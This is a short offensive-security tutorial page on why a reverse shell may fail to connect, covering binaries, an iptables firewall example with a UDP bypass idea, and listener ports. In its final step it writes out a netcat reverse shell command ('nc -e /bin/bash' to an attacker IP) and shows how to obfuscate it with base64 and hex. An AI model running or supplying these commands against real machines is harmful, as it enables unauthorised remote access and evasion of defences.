# Troubleshooting Shells

Sometimes when trying to obtain a reverse shell, we do not receive any connection. Here is a methodology to solve this problem.

## Methodology

### Step #1

Although it sounds obvious, we must verify that the syntax is correct.

### Step #2

Verify if the binary/program exists on the compromised machine. For example, if we use the "bash" binary to start a shell, verify that it exists. In case it does not exist, there are other options such as "sh". Remember to test with various programs, such as powershell, Python, C, etc. and to perform the [RCE check](rce-check.md).

### Step #3

The firewall may be the cause of this problem. In that case, we will have to check its rules and see if there is a way to bypass them.

Example on Linux with IPTables rules:

```bash
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
```

It starts by setting the default for inbound (**INPUT**) as **DROP** and for outbound (**OUTPUT**) and forward as **ACCEPT**. Then reading from the top:

* TCP 53 inbound is allowed
* TCP 22 inbound is allowed
* All UDP inbound is allowed
* All new TCP connections outbound are dropped.

Then, since all new outgoing TCP connections are discarded, we cannot initiate a reverse shell over this protocol. However, since incoming and outgoing connections (this one by default) are accepted over UDP, we can circumvent firewall rules.

### Step #4

Use common ports or ports that are open on the compromised machine to configure the listener with netcat. Examples: 80,443,53,22, etc.

### Step #5

Encode the malicious code to obtain a shell. You can use URL encode, base64, hexadecimal (this can help us to obfuscate our IP using netcat), etc. Examples:

```bash
echo -n 'nc -e /bin/bash 10.10.10.10 443' | base64 -w 0
nc -e /bin/bash 0x0a0a0a0a 443 # 0x0a0a0a0a = 10.10.10.10
```
